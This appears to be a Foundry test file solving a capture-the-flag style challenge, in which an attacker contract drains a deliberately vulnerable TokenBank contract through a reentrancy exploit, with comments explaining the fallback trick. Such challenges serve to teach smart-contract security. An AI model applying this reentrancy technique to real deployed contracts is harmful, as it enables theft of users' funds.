// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/TokenBank.sol";

contract TankBankTest is Test {
    TokenBankChallenge public challenge;
    TokenBankAttacker public attack;
    address player = address(1234);
    address owner = vm.addr(0x12);


    function setUp() public {
        vm.startPrank(owner);
        challenge = new TokenBankChallenge(player);
        attack = new TokenBankAttacker(address(challenge));
        vm.stopPrank();
    }

    function testExploit() public {

        // Check initial balances
        uint256 InitialSplitBalance = 500000 * 10 ** 18;
        assertEq(challenge.balanceOf(player), InitialSplitBalance);
        assertEq(challenge.balanceOf(address(owner)), InitialSplitBalance);

        vm.startPrank(player);
        // First withdraw 
        challenge.withdraw(InitialSplitBalance);

        // Transfer will call a fallback function because : 
            // isContract(to) is true => the receiver is a contract => call fallback function on the receiver contract 
            // the first fallback function : from is from the player, so callWithdraw is not called since there is a return. 
        challenge.token().transfer(address(attack), InitialSplitBalance); // 
        attack.deposit();
        // Check that attacker owns tokens in the Bank 
        assertEq(challenge.balanceOf(address(attack)), InitialSplitBalance);
        // Execute attack to exploit reentrancy 
        attack.attack();
        vm.stopPrank();
        // verify that the attacker contract owns all the tokens
        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(challenge.isComplete(), "Challenge Incomplete");
    }
}
